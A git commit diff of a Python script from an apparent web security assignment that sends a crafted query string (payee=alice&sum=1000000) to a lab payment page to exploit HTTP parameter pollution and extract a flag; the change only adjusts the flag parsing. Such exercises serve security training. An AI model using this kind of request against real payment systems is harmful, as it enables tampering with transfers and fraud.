2c3e90b6c2a5ab352fe11c8ddf228ea61a417855
Yumingyuan <timdavid@vip.qq.com>
2019-05-23 16:16:07 +0800

    parameter pollution

--- wsb/case14_parameter_pollution.py
+++ wsb/case14_parameter_pollution.py
@@ -4,5 +4,5 @@ base_url="http://www.wsb.com/Assignment2/case14.php?"
 polluted_parameter="payee=alice&sum=1000000"
 r=requests.get(base_url+polluted_parameter)
 #print(r.text)
-re_result=re.search("The flag is (.*)?<br/>",r.text)
-print(re_result.group(0))
+re_result=re.findall("The flag is (.*)?<br/>",r.text)
+print("The flag is:"+re_result[0])
